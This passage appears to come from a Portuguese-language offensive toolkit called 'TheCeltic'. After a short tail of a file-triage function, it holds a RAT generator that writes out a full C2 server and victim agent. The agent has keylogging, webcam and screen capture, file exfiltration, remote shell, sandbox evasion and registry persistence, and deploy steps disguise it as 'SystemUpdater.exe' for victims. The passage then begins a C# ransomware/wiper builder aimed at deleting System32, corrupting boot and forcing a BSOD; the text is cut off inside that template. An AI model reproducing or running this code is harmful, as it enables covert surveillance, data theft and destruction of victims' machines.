                is_office = any(f.startswith('word/') or f.startswith('xl/') or f.startswith('ppt/') for f in file_list)
                
                if is_jar:
                    file_type = "Arquivo Java (JAR)"
                    print(f"[INFO] Classificado como JAR ({len(file_list)} classes/arquivos).")
                elif is_office:
                    file_type = "Documento Office (ZIP-based)"
                    print(f"[INFO] Classificado como Documento Office.")
                                     
                    macros = [f for f in file_list if 'vbaProject' in f]
                    if macros:
                        print(f"{RED}[ALERTA]{RESET} Macros VBA detectadas: {macros}")
                else:
                    print(f"[INFO] ZIP genérico ({len(file_list)} arquivos).")
                
                                                                    
                if len(file_list) <= 20:
                    print("Conteúdo do ZIP:")
                    for f in file_list:
                        print(f"  - {f}")
                else:
                    print(f"Primeiros 10 arquivos do ZIP:")
                    for f in file_list[:10]:
                        print(f"  - {f}")
                    print(f"  ... e mais {len(file_list) - 10} arquivos.")
                    
                                                                   
                sensitive_files = [f for f in file_list if any(kw in f.lower() for kw in ['config', 'manifest', 'security', 'key', 'cert'])]
                if sensitive_files:
                    print(f"{YELLOW}[INFO]{RESET} Arquivos potencialmente sensíveis detectados:")
                    for sf in sensitive_files[:5]:
                        print(f"  - {sf}")

        except zipfile.BadZipFile:
            print(f"{YELLOW}[WARN]{RESET} Arquivo ZIP inválido ou corrompido.")

                                          
    elif file_path.lower().endswith(('.txt', '.md', '.log', '.html', '.htm', '.json', '.xml', '.csv')) or (data[:1] in [b'{', b'[', b'<'] and all(b > 31 or b in (9, 10, 13) for b in data[:100])):
        file_type = "Texto Estruturado (HTML/JSON/XML/TXT)"
        print(f"{GREEN}[INFO]{RESET} Arquivo identificado como Texto Estruturado.")
        
                                                
        text_data = data.decode('utf-8', errors='ignore')
        
              
        urls = re.findall(r'https?://[^\s<>"]+[^.,\)\]\s]', text_data)
        if urls:
            print(f"{BLUE}[INFO]{RESET} URLs encontradas ({len(urls)}):")
            for url in list(set(urls))[:10]:
                print(f"  - {url}")
        
                 
        emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', text_data)
        if emails:
            print(f"{BLUE}[INFO]{RESET} E-mails encontrados ({len(emails)}):")
            for email in list(set(emails))[:5]:
                print(f"  - {email}")
        
             
        ips = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', text_data)
        if ips:
                                                                              
            interesting_ips = [ip for ip in ips if not ip.startswith(('127.', '10.', '192.168.'))]
            if interesting_ips:
                print(f"{BLUE}[INFO]{RESET} IPs externos encontrados ({len(interesting_ips)}):")
                for ip in list(set(interesting_ips))[:5]:
                    print(f"  - {ip}")
                    
                                                    
        password_patterns = re.findall(r'(?i)(password|passwd|pwd|secret|token|api[_-]?key)\s*[:=]\s*["\']?([^\s"\']{4,})', text_data)
        if password_patterns:
            print(f"{RED}[ALERTA]{RESET} Possíveis credenciais em texto plano detectadas:")
            for key, val in password_patterns[:5]:
                print(f"  - {key}: {val[:20]}{'...' if len(val) > 20 else ''}")

    else:
        print(f"{YELLOW}[INFO]{RESET} Tipo de arquivo não específico. Análise baseada apenas em entropia e strings.")

                         
    print("\n" + "="*20)
    print(" 📊 RESUMO EXECUTIVO")
    print("="*20)
    print(f"Arquivo: {os.path.basename(file_path)}")
    print(f"Tipo: {file_type}")
    print(f"SHA-256: {hashes['sha256']}")
    print(f"Entropia: {entropy:.4f}")
    
    if found_packer:
        print(f"Packer: {found_packer}")
        
    if interesting_strings:
        print(f"Strings Críticas: {len(interesting_strings)}")
        
    print(f"\n{GREEN}[CONCLUÍDO]{RESET} Análise finalizada.")
    print("="*50)
               
import os
import textwrap
import subprocess

def rat_generator():
    print("\n" + "="*50)
    print(" 🕷️ THECELTIC RAT GENERATOR [FIELD OPERATIONS v2.1]")
    print("="*50)
    print("""
    Gera um par C2/Agente otimizado para operações de campo.
    
    Recursos:
    1. Protocolo de Framing (\\n\\n) para pacotes grandes.
    2. Multi-tenant C2 (gerencia vários agentes).
    3. Input Control (Mouse/Keyboard).
    4. Webcam & Screenshot.
    5. Persistência Automática (HKCU\\Run).
    6. Sandbox Detection.
    """)

    # 1. CONFIGURAÇÃO
    print("[1] Configuração do C2")
    c2_host = input("IP/Host do C2 (padrão 127.0.0.1): ").strip() or "127.0.0.1"
    c2_port = input("Porta do C2 (padrão 4444): ").strip() or "4444"

    print("\n[2] Identidade do Agente")
    agent_name = input("Nome do Agente (ex: VICTIM-01): ").strip() or "AGENT-01"
    sleep_time = input("Sleep inicial (seg, padrão 5): ").strip() or "5"
    jitter = input("Jitter % (padrão 10): ").strip() or "10"

    # Placeholders para substituição segura (evita conflito com f-strings)
    placeholders = {
        "__C2_HOST__": c2_host,
        "__C2_PORT__": c2_port,
        "__AGENT_NAME__": agent_name,
        "__BASE_SLEEP__": sleep_time,
        "__JITTER__": jitter
    }

    def generate_code(template):
        for k, v in placeholders.items():
            template = template.replace(k, v)
        return template

    # 2. TEMPLATE C2 SERVER
    c2_template = r'''import socket
import threading
import os
import json
import time
import base64
import queue
from datetime import datetime

GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"

class AgentHandler:
    def __init__(self, client, address, manager):
        self.client = client
        self.address = address
        self.manager = manager
        self.is_active = True
        self.agent_id = f"{address[0]}:{address[1]}"
        self.recv_buffer = b""
        self.metadata = {}
        
    def send(self, data):
        if isinstance(data, str):
            data = data.encode('utf-8')
        if not data.endswith(b"\n\n"):
            data += b"\n\n"
        try:
            self.client.sendall(data)
        except OSError as e:
            print(f"{RED}[ERRO]{RESET} Falha ao enviar para {self.agent_id}: {e}")
            self.is_active = False

    def _recv_packet(self):
        while b"\n\n" not in self.recv_buffer:
            try:
                chunk = self.client.recv(4096)
                if not chunk:
                    self.is_active = False
                    return None
                self.recv_buffer += chunk
            except socket.error:
                self.is_active = False
                return None
        packet, self.recv_buffer = self.recv_buffer.split(b"\n\n", 1)
        return packet.decode('utf-8', errors='replace')

    def run(self):
        print(f"{GREEN}[+] NOVO AGENTE: {self.agent_id} (ID: {self.manager.get_agent_index(self.agent_id)}){RESET}")
        idx = self.manager.register(self)
        self.send(json.dumps({"type": "ack", "data": "connected", "id": idx}))

        while self.is_active:
            raw_data = self._recv_packet()
            if raw_data is None: break
            
            try:
                msg = json.loads(raw_data)
                self._handle_message(msg)
            except json.JSONDecodeError:
                continue

        self.manager.unregister(self.agent_id)
        print(f"{RED}[!] AGENTE DESCONECTADO: {self.agent_id}{RESET}")
        try: self.client.close()
        except: pass

    def _handle_message(self, msg):
        t = msg.get('type')
        
        if t == 'heartbeat':
            self.metadata = msg
            self.manager.update_status(self.agent_id, msg)
            print(f"{CYAN}[HB]{RESET} {self.agent_id} | User: {msg.get('user')} | Uptime: {msg.get('uptime')}s", end="\r")
            
        elif t == 'keylog':
            print(f"\n{YELLOW}[KEYLOG]{RESET} {self.agent_id}: {msg.get('data')}")
            
        elif t == 'screenshot':
            data = msg.get('data')
            if data and data != "NO_SCREEN_LIB":
                os.makedirs("screenshots", exist_ok=True)
                fname = f"screenshots/{self.agent_id.replace(':', '_')}_{int(time.time())}.png"
                with open(fname, 'wb') as f: f.write(base64.b64decode(data))
                print(f"\n{GREEN}[SCREEN]{RESET} Salvo: {fname}")
                
        elif t == 'webcam':
            data = msg.get('data')
            if data and data not in ["NO_CAMERA_LIB", "CAMERA_ERROR"]:
                os.makedirs("webcam", exist_ok=True)
                fname = f"webcam/{self.agent_id.replace(':', '_')}_{int(time.time())}.png"
                with open(fname, 'wb') as f: f.write(base64.b64decode(data))
                print(f"\n{GREEN}[WEBCAM]{RESET} Salvo: {fname}")
            else:
                print(f"\n[YELLOW][WEBCAM]{RESET} Status: {data}")

        elif t == 'file_exfil':
            fname = msg.get('filename', 'unknown.bin')
            data = msg.get('data')
            if data and data not in ["FILE_NOT_FOUND", "FILE_TOO_LARGE"]:
                os.makedirs("exfil", exist_ok=True)
                safe_name = fname.replace("..", "_")
                out_path = f"exfil/{safe_name}"
                with open(out_path, 'wb') as f: f.write(base64.b64decode(data))
                print(f"\n{GREEN}[EXFIL]{RESET} Recebido: {out_path} ({len(data)} bytes b64)")
            else:
                print(f"\n[YELLOW][EXFIL]{RESET} {data}")

        elif t == 'shell_output':
            print(f"\n{CYAN}[OUTPUT]{RESET}\n{msg.get('data')}")
            
        elif t == 'status':
            print(f"\n{GREEN}[STATUS]{RESET} PID: {msg.get('pid')} | Agent: {msg.get('agent')}")
        elif t == 'error':
            print(f"\n{RED}[ERRO AGENTE]{RESET} {msg.get('data')}")
        else:
            print(f"\n[DEBUG] Pacote desconhecido: {t}")

class C2Manager:
    def __init__(self):
        self.agents = {}
        self.lock = threading.Lock()
        self.current_focus = None

    def register(self, handler):
        with self.lock:
            self.agents[handler.agent_id] = handler
            return len(self.agents) - 1

    def unregister(self, agent_id):
        with self.lock:
            self.agents.pop(agent_id, None)
            if self.current_focus == agent_id:
                self.current_focus = None

    def update_status(self, agent_id, data):
        pass

    def get_agent_index(self, agent_id):
        with self.lock:
            ids = list(self.agents.keys())
            return ids.index(agent_id) if agent_id in ids else -1

    def list_agents(self):
        with self.lock:
            return list(self.agents.keys())

    def get_handler(self, agent_id):
        with self.lock:
            return self.agents.get(agent_id)

def interactive_loop(manager):
    print(f"\n{GREEN}[C2 INTERATIVO]{RESET} Agente focado: [Nenhum]")
    print("Comandos C2: list, use <id>, broadcast <cmd>, exit")
    print("Comandos Agente: shell <cmd>, screenshot, webcam, send <path>, status, move_mouse <x> <y>, click_mouse, type_text <txt>, press_key <key>, exit")
    
    while True:
        try:
            focus_id = manager.current_focus
            prompt = f"> [{focus_id}] " if focus_id else f"> [GLOBAL] "
            user_input = input(prompt).strip()
            
            if not user_input: continue
            
            if user_input.startswith("list"):
                agents = manager.list_agents()
                if not agents:
                    print("Nenhum agente conectado.")
                    continue
                print("\nAgentes Conectados:")
                for i, a in enumerate(agents):
                    marker = " (FOCO)" if a == manager.current_focus else ""
                    print(f"  [ID {i}] {a}{marker}")
                continue

            elif user_input.startswith("use "):
                target_id = user_input[4:].strip()
                if target_id.isdigit():
                    idx = int(target_id)
                    agents = manager.list_agents()
                    if 0 <= idx < len(agents):
                        manager.current_focus = agents[idx]
                        print(f"Foco alterado para: {manager.current_focus}")
                    else:
                        print("ID inválido.")
                else:
                    matches = [a for a in manager.list_agents() if target_id in a]
                    if len(matches) == 1:
                        manager.current_focus = matches[0]
                        print(f"Foco alterado para: {manager.current_focus}")
                    elif len(matches) > 1:
                        print(f"Vários matches: {matches}. Use ID exato.")
                    else:
                        print("Agente não encontrado.")
                continue

            elif user_input == "exit":
                break

            elif user_input.startswith("broadcast "):
                cmd = user_input[10:].strip()
                count = 0
                for agent_id in manager.list_agents():
                    h = manager.get_handler(agent_id)
                    if h:
                        h.send(cmd)
                        count += 1
                print(f"Comando enviado para {count} agentes.")
                continue

            if not manager.current_focus:
                print("Nenhum agente focado. Use 'list' e 'use <id>'.")
                continue

            h = manager.get_handler(manager.current_focus)
            if not h:
                print("Agente focado desconectou.")
                manager.current_focus = None
                continue

            h.send(user_input)
            time.sleep(0.1)

        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"Erro no loop: {e}")

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server.bind(("__C2_HOST__", int("__C2_PORT__")))
    except OSError as e:
        print(f"[ERRO] Porta indisponível: {e}")
        return

    server.listen(5)
    print("\n" + "="*60)
    print(f" 🕷️  THECELTIC C2 SERVER [ACTIVE] ({__C2_HOST__}:{__C2_PORT__})")
    print("="*60 + "\n")

    manager = C2Manager()
    
    accept_thread = threading.Thread(target=lambda: _accept_loop(server, manager), daemon=True)
    accept_thread.start()
    
    interactive_loop(manager)
    
    try:
        server.close()
    except:
        pass

def _accept_loop(server, manager):
    while True:
        try:
            client, addr = server.accept()
            handler = AgentHandler(client, addr, manager)
            t = threading.Thread(target=handler.run, daemon=True)
            t.start()
        except Exception as e:
            print(f"Erro no Accept: {e}")

if __name__ == "__main__":
    main()
'''

    # 3. TEMPLATE AGENT
    agent_template = r'''import os
import sys
import socket
import json
import time
import base64
import subprocess
import platform
import random
import threading
import importlib
import queue
import shutil

CREATE_NO_WINDOW = 0x08000000

def ensure_dependencies():
    required = [
        ('pynput', 'pynput'),
        ('mss', 'mss'),
        ('PIL', 'Pillow'),
        ('cv2', 'opencv-python')
    ]
    for module_name, pip_name in required:
        try:
            importlib.import_module(module_name)
        except ImportError:
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name], creationflags=CREATE_NO_WINDOW if os.name == 'nt' else 0)
            except subprocess.CalledProcessError as e:
                pass

C2_HOST = "__C2_HOST__"
C2_PORT = int("__C2_PORT__")
AGENT_NAME = "__AGENT_NAME__"
BASE_SLEEP = int("__BASE_SLEEP__")
JITTER = int("__JITTER__")
KEYLOG_BUFFER_SIZE = 50
REGISTRY_KEY_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"

keylog_buffer = []
start_time = time.time()
is_in_vm = False
mouse_controller = None
keyboard_controller = None
outgoing_queue = queue.Queue()
last_heartbeat = time.time()

def log(msg):
    pass

def init_input_controllers():
    global mouse_controller, keyboard_controller
    try:
        from pynput import mouse, keyboard
        mouse_controller = mouse.Controller
        keyboard_controller = keyboard.Controller
    except ImportError:
        pass

def check_sandbox():
    global is_in_vm
    try:
        if platform.system() == "Windows":
            out = subprocess.check_output("wmic COMPUTERSYSTEM get NAME, MANUFACTURER", shell=True, creationflags=CREATE_NO_WINDOW).decode('utf-8', errors='ignore')
            vm_signatures = ["VMware", "VirtualBox", "Microsoft Corporation", "QEMU", "KVM", "innotek"]
            for sig in vm_signatures:
                if sig.lower() in out.lower():
                    is_in_vm = True
                    break
    except Exception:
        pass

def get_system_info():
    return {
        "type": "heartbeat",
        "os": f"{platform.system()} {platform.release()}",
        "user": os.getlogin() if os.name != 'nt' else os.environ.get('USERNAME', 'Unknown'),
        "uptime": int(time.time() - start_time),
        "pid": os.getpid(),
        "agent": AGENT_NAME
    }

def run_command(cmd):
    try:
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW if os.name == 'nt' else 0)
        stdout, stderr = proc.communicate(timeout=30)
        return {
            "type": "shell_output",
            "data": stdout.decode('utf-8', errors='replace') + "\n" + stderr.decode('utf-8', errors='replace')
        }
    except Exception as e:
        return {"type": "shell_output", "data": f"Error: {e}"}

def capture_screenshot():
    try:
        from PIL import Image, ImageGrab
        import io
        img = ImageGrab.grab()
        img = img.convert("RGB")
        buf = io.BytesIO()
        img.save(buf, format='PNG')
        b64_data = base64.b64encode(buf.getvalue()).decode('utf-8')
        return {"type": "screenshot", "data": b64_data}
    except ImportError:
        try:
            import mss
            import mss.tools
            with mss.mss() as sct:
                shot = sct.grab(sct.monitors[1])
                img_data = mss.tools.to_png(shot.rgb, shot.size)
                b64_data = base64.b64encode(img_data).decode('utf-8')
                return {"type": "screenshot", "data": b64_data}
        except ImportError:
            return {"type": "screenshot", "data": "NO_SCREEN_LIB"}
    except Exception as e:
        return {"type": "screenshot", "data": f"ERROR: {e}"}

def capture_webcam():
    try:
        import cv2
        import io
        
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return {"type": "webcam", "data": "CAMERA_ERROR: Não foi possível abrir a câmera."}
        
        time.sleep(0.5)
        ret, frame = cap.read()
        cap.release()
        
        if not ret:
            return {"type": "webcam", "data": "CAMERA_ERROR: Falha ao capturar frame."}
        
        success, buffer = cv2.imencode('.png', frame)
        if not success:
            return {"type": "webcam", "data": "CAMERA_ERROR: Falha ao codificar imagem."}
            
        b64_data = base64.b64encode(buffer).decode('utf-8')
        return {"type": "webcam", "data": b64_data}
        
    except ImportError:
        return {"type": "webcam", "data": "NO_CAMERA_LIB"}
    except Exception as e:
        return {"type": "webcam", "data": f"ERROR: {e}"}

def exfiltrate_file(path):
    try:
        if not os.path.exists(path):
            return {"type": "file_exfil", "filename": "ERROR", "data": "FILE_NOT_FOUND"}
        
        max_size = 5 * 1024 * 1024
        if os.path.getsize(path) > max_size:
            return {"type": "file_exfil", "filename": "ERROR", "data": "FILE_TOO_LARGE"}
            
        with open(path, 'rb') as f:
            data = base64.b64encode(f.read()).decode('utf-8')
        return {
            "type": "file_exfil",
            "filename": os.path.basename(path),
            "data": data
        }
    except Exception as e:
        return {"type": "file_exfil", "filename": "ERROR", "data": str(e)}

def handle_input_command(cmd_str):
    parts = cmd_str.split()
    if not parts:
        return {"type": "error", "data": "Comando de input vazio"}
    
    action = parts[0]
    
    if mouse_controller is None:
        return {"type": "error", "data": "pynput não disponível"}

    try:
        if action == "move_mouse":
            if len(parts) >= 3:
                x, y = int(parts[1]), int(parts[2])
                mouse_controller.position = (x, y)
                return {"type": "ack", "data": f"Mouse movido para {x},{y}"}
            else:
                return {"type": "error", "data": "Sintaxe: move_mouse <x> <y>"}
                
        elif action == "click_mouse":
            mouse_controller.click()
            return {"type": "ack", "data": "Clique executado"}
            
        elif action == "type_text":
            text = " ".join(parts[1:])
            keyboard_controller.type(text)
            return {"type": "ack", "data": f"Texto digitado: {text}"}
            
        elif action == "press_key":
            key = parts[1] if len(parts) > 1 else "enter"
            try:
                from pynput import keyboard
                key_map = {
                    "enter": keyboard.Key.enter,
                    "tab": keyboard.Key.tab,
                    "space": keyboard.Key.space,
                    "esc": keyboard.Key.esc,
                    "backspace": keyboard.Key.backspace,
                    "delete": keyboard.Key.delete,
                    "up": keyboard.Key.up,
                    "down": keyboard.Key.down,
                    "left": keyboard.Key.left,
                    "right": keyboard.Key.right
                }
                key_obj = key_map.get(key.lower(), key)
                keyboard_controller.press(key_obj)
                keyboard_controller.release(key_obj)
                return {"type": "ack", "data": f"Tecla {key} pressionada"}
            except Exception as e:
                return {"type": "error", "data": f"Erro ao pressionar tecla: {e}"}
            
        else:
            return {"type": "error", "data": f"Ação de input desconhecida: {action}"}
    except Exception as e:
        return {"type": "error", "data": f"Erro no input: {e}"}

def setup_persistence():
    if platform.system() != "Windows":
        return
    
    try:
        import winreg
        
        appdata = os.environ.get("APPDATA", os.path.expanduser("~"))
        dest_dir = os.path.join(appdata, "Microsoft", "Windows")
        if not os.path.exists(dest_dir):
            os.makedirs(dest_dir)
        
        if sys.executable.lower().endswith(".exe") and "python" not in os.path.basename(sys.executable).lower():
            dest_name = f"{AGENT_NAME}.exe"
        else:
            dest_name = f"{AGENT_NAME}.py"
            
        dest_path = os.path.join(dest_dir, dest_name)
        
        if "python" in sys.executable.lower():
             if os.path.exists(__file__):
                 if os.path.abspath(__file__) != os.path.abspath(dest_path):
                     shutil.copy2(__file__, dest_path)
                     current_path = f'"{sys.executable}" "{dest_path}"'
                 else:
                     current_path = f'"{sys.executable}" "{os.path.abspath(__file__)}"'
             else:
                 current_path = f'"{sys.executable}"'
        else:
            if os.path.abspath(sys.executable) != os.path.abspath(dest_path):
                 try:
                     shutil.copy2(sys.executable, dest_path)
                 except PermissionError:
                     pass
            current_path = f'"{dest_path}"'
            
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REGISTRY_KEY_PATH, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, AGENT_NAME, 0, winreg.REG_SZ, current_path)
        winreg.CloseKey(key)
        log(f"[PERSISTENCE] Adicionado ao Registro (Run). Caminho: {current_path}")
        
    except Exception as e:
        log(f"[PERSISTENCE] Falha ao setar persistência: {e}")

def keylogger_listener_safe():
    global keylog_buffer
    try:
        from pynput import keyboard
    except ImportError:
        log("[KEYLOG] pynput não instalado. Keylogger desativado.")
        return

    def on_press(key):
        try:
            char = key.char if key.char else str(key)
            keylog_buffer.append(char)
            
            if len(keylog_buffer) >= KEYLOG_BUFFER_SIZE:
                data_to_send = "".join(keylog_buffer)
                keylog_buffer.clear()
                outgoing_queue.put({"type": "keylog", "data": data_to_send})
        except AttributeError:
            keylog_buffer.append(str(key))
            
    def on_release(key):
        return False

    with keyboard.Listener(on_press=on_press, on_release=on_release):
        while True:
            time.sleep(1)

def process_command(cmd_str, socket_obj):
    if not cmd_str:
        return True

    try:
        cmd_json = json.loads(cmd_str)
        cmd_type = cmd_json.get("cmd", cmd_str)
    except json.JSONDecodeError:
        cmd_type = cmd_str

    response = None
    cmd_lower = cmd_type.lower().strip()

    if cmd_lower == "screenshot":
        response = capture_screenshot()
    elif cmd_lower == "webcam":
        response = capture_webcam()
    elif cmd_lower.startswith("send "):
        path = cmd_type[5:].strip()
        response = exfiltrate_file(path)
    elif cmd_lower.startswith("move_mouse") or cmd_lower.startswith("click_mouse") or cmd_lower.startswith("type_text") or cmd_lower.startswith("press_key"):
        response = handle_input_command(cmd_type)
    elif cmd_lower == "status":
        response = get_system_info()
        response["type"] = "status"
    elif cmd_lower.startswith("shell "):
        cmd = cmd_type[6:].strip()
        response = run_command(cmd)
    elif cmd_lower in ["exit", "disconnect"]:
        try:
            socket_obj.close()
        except Exception:
            pass
        return False
    else:
        response = run_command(cmd_type)

    if response:
        try:
            payload = json.dumps(response) + "\n\n"
            socket_obj.sendall(payload.encode('utf-8'))
        except OSError as e:
            log(f"[SOCKET] Erro ao enviar resposta: {e}")
            return False

    return True

def main():
    log(f"Iniciando Agente TheCeltic: {AGENT_NAME}")
    ensure_dependencies()
    init_input_controllers()
    check_sandbox()
    
    if not hasattr(main, '_persistence_set'):
        setup_persistence()
        main._persistence_set = True

    if not is_in_vm:
        log("[KEYLOG] Iniciando listener de teclado...")
        keylog_thread = threading.Thread(target=keylogger_listener_safe, daemon=True)
        keylog_thread.start()
    else:
        log("[KEYLOG] Keylogger desativado (Modo Sandbox).")

    while True:
        try:
            if not hasattr(main, '_is_connected'):
                current_sleep = BASE_SLEEP * (1 + (random.randint(-JITTER, JITTER) / 100.0))
                time.sleep(current_sleep)

            log(f"Tentando conectar ao C2: {C2_HOST}:{C2_PORT}...")
            
            with socket.create_connection((C2_HOST, C2_PORT), timeout=10) as s:
                main._is_connected = True
                log(f"[CONEXÃO] Conectado com sucesso ao C2.")
                
                heartbeat = json.dumps(get_system_info()) + "\n\n"
                s.sendall(heartbeat.encode('utf-8'))
                
                recv_buffer = b""
                
                while True:
                    # Flush da fila de saída
                    while not outgoing_queue.empty():
                        packet = outgoing_queue.get_nowait()
                        s.sendall((json.dumps(packet) + "\n\n").encode('utf-8'))

                    # Heartbeat periódico (a cada 30s) para manter NAT
                    if time.time() - last_heartbeat > 30:
                        s.sendall((json.dumps(get_system_info()) + "\n\n").encode('utf-8'))
                        last_heartbeat = time.time()

                    s.settimeout(0.5)
                    try:
                        chunk = s.recv(4096)
                        if chunk:
                            recv_buffer += chunk
                    except socket.timeout:
                        continue
                    
                    while b"\n\n" in recv_buffer:
                        raw_packet, recv_buffer = recv_buffer.split(b"\n\n", 1)
                        cmd_str = raw_packet.decode('utf-8', errors='replace').strip()
                        
                        if not cmd_str:
                            continue
                        
                        should_continue = process_command(cmd_str, s)
                        if not should_continue:
                            try:
                                s.close()
                            except:
                                pass
                            return

        except Exception as e:
            log(f"[ERRO CONEXÃO] {e}")
            main._is_connected = False
            recon_sleep = BASE_SLEEP * (1 + (random.randint(-JITTER, JITTER) / 100.0))
            time.sleep(recon_sleep)

if __name__ == "__main__":
    main()
'''

    # 4. GERAÇÃO DOS ARQUIVOS
    print("\n[3] Gerando Artefatos de Campo...")
    
    c2_final_code = generate_code(c2_template)
    agent_final_code = generate_code(agent_template)

    c2_filename = "C2_Server.py"
    with open(c2_filename, "w", encoding="utf-8") as f:
        f.write(c2_final_code)
    print(f"[OK] Servidor C2 gerado: {os.path.abspath(c2_filename)}")

    agent_filename = "Victim_Agent.py"
    with open(agent_filename, "w", encoding="utf-8") as f:
        f.write(agent_final_code)
    print(f"[OK] Agente da Vítima gerado: {os.path.abspath(agent_filename)}")
    
    def run_background(script_path):
        if os.name == 'nt':
            subprocess.Popen(f'pythonw "{script_path}"', shell=True)
        else:
            subprocess.Popen(f'nohup python3 "{script_path}" > agent_debug.log 2>&1 &', shell=True)

    run_now = input("Executar o Agente agora em segundo plano? (s/n): ").strip().lower() == 's'
    if run_now:
        run_background(agent_filename)
        print(f"[INFO] Agente iniciado em segundo plano.")

    print("\n" + "="*50)
    print(" 📋 INSTRUÇÕES DE DEPLOY")
    print("="*50)
    print("""
    [PASSO 1: DEPENDÊNCIAS]
    O Agente usa bibliotecas opcionais. Para a vítima, compile um .exe único.
    pip install pynput mss pillow opencv-python
    
    [PASSO 2: COMPILAÇÃO (PyInstaller)]
    pyinstaller --onefile --windowed --name "SystemUpdater" Victim_Agent.py
    
    O arquivo final estará em: ./dist/SystemUpdater.exe      

    [PASSO 3: OPERAÇÃO]
    1. No seu Kali/Linux, execute: python C2_Server.py
    2. Envie o SystemUpdater.exe para a vítima.
    3. A vítima executa o .exe.
    4. No C2, use 'list' para ver agentes e 'use <id>' para focar.
    
    [COMANDOS NO C2]
    - list                  -> Lista agentes conectados
    - use 0                 -> Define foco no agente ID 0
    - broadcast shell whoami-> Envia 'shell whoami' para todos
    - shell ipconfig        -> Executa comando no agente focado
    - screenshot            -> Captura tela
    - webcam                -> Captura de webcam
    - send C:\\Users\\doc.txt -> Exfiltra arquivo
    - move_mouse 500 300    -> Move mouse
    - click_mouse           -> Clique esquerdo
    - type_text Olá         -> Digita texto
    - press_key enter       -> Pressiona tecla
    - status                -> Mostra status
    - exit                  -> Encerra C2
    
    [NOTA TÉCNICA]
    - O protocolo usa delimitador \\n\\n para evitar fragmentação de pacotes grandes.
    - O Heartbeat é enviado a cada 30s automaticamente.
    """)
    
    input("\nPressione ENTER para finalizar o gerador...")
    
                            
import os
import sys
import shutil
import subprocess

def destruction_suite():
    print("\n" + "="*50)
    print(" 💣 THECELTIC DESTRUCTION SUITE [FINAL ENGINE]")
    print("="*50)
    print("""
    Este módulo gera um payload de "Ransomware de Destruição" em C#.
    
    Recursos:
    1. Modo Kiosk Total: Sem barra de título, tela cheia, não move.
    2. Destruição Nuclear: Apaga System32, WinSxS e Logs.
    3. BSOD Trigger: Força Tela Azul via NtBugCheck.
    4. Persistência: Volta no Boot e renasce se matado.
    5. Compatível com .NET Framework 4.x (csc.exe nativo).
    """)
                                
    print("\n[1] Configuração do Agente")
    agent_name = input("Nome do Agente (ex: CELTIC-WIPER): ").strip() or "CELTIC_ORDER"
    safe_name = "".join(c for c in agent_name if c.isalnum() or c in ("-", "_"))
                                  
    print("\n[2] Definição da Chave de Resgate")
    secret_key = input("Senha secreta (a vítima precisa digitar isso): ").strip() or "1337"
    print(f"[INFO] Senha definida: {secret_key}")
                             
    print("\n[3] Recado Personalizado (Ransom Note)")
    print("Digite o texto que aparecerá na tela da vítima.")
    print("Use ENTER para pular linha. Terminar com uma linha vazia.")
    
    note_lines = []
    print("--- INÍCIO DO RECADADO ---")
    while True:
        line = input(f"Linha {len(note_lines)+1}> ")
        if line == "":
            break
        note_lines.append(line)
    print("--- FIM DO RECADADO ---")
    
    final_note = "\n".join(note_lines) if note_lines else "SEUS DADOS FORAM SEQUESTRADOS PELO THE CELTIC ORDER."
                          
    # Escapa aspas duplas para string C#
    escaped_note = final_note.replace('"', '\\"')
                                  
    print("\n[4] Modo de Destruição (Executado após 3 erros)")
    print("[1] System32 Nuke (Remove DLLs críticas)")
    print("[2] Registry & Boot (Corrompe BCD/Boot)")
    print("[3] Forensic Wipe (Limpa Logs e Histórico)")
    print("[4] Total Annihilation (Executa todos os modos + BSOD)")
    
    mode_choice = input("Escolha (1-4): ").strip() or "4"
    
    flag_sys32 = mode_choice in ["1", "4"]
    flag_registry = mode_choice in ["2", "4"]
    flag_forensic = mode_choice in ["3", "4"]
    flag_bsod = mode_choice == "4" or input("Forçar BSOD final? (s/n): ").strip().lower() == 's'

                                                  
    template_payload = r'''
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Linq;

namespace CelticOrderRansomware
{
    public class Program
    {
        // --- CONFIGURAÇÕES ---
        static string AGENT_NAME = "__AGENT_NAME__";
        static string SECRET_KEY = "__SECRET_KEY__";
        static string NOTE_TEXT = "__NOTE_TEXT__";
        static bool MODE_SYS32 = __FLAG_SYS32__;
        static bool MODE_REGISTRY = __FLAG_REGISTRY__;
        static bool MODE_FORENSIC = __FLAG_FORENSIC__;
        static bool MODE_BSOD = __FLAG_BSOD__;

        static int attempts = 0;
        static int maxAttempts = 3;
        static volatile bool isDestroyed = false;
        static volatile bool isDestructionInProgress = false;
        static string LOG_PATH = "C:\\CelticWiper.log";

        // --- P/Invoke para BSOD ---
        [DllImport("ntdll.dll")]
        private static extern void NtBugCheck(ulong BugCheckCode, ulong Parameter1, ulong Parameter2, ulong Parameter3);

        static void Log(string message)
        {
            try {
                File.AppendAllText(LOG_PATH, "[" + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss.fff") + "] " + message + "\n");
            } catch { }
        }

        [STAThread]
        static void Main(string[] args)
        {
            Log("=== INICIANDO THE CELTIC DESTRUCTION SUITE ===");
            Log("Privilégios de Admin: " + IsAdmin().ToString());
            
            // Verifica se foi chamado especificamente para o wipe administrativo
            bool isAdminWipeOnly = Array.Exists(args, a => a == "--admin-wipe-only");

            if (isAdminWipeOnly)
            {
                Log("Modo Admin Wipe detectado. Executando wipe direto...");
                ExecuteAdminWipe();
                // Esta instância auxiliar pode terminar após o comando
                Environment.Exit(0);
            }

            // 1. Garante persistência no registro
            EnsurePersistence();

            // 2. Inicia Anti-Task Manager
            StartAntiTaskManager();

            // 3. Inicia a Interface Gráfica
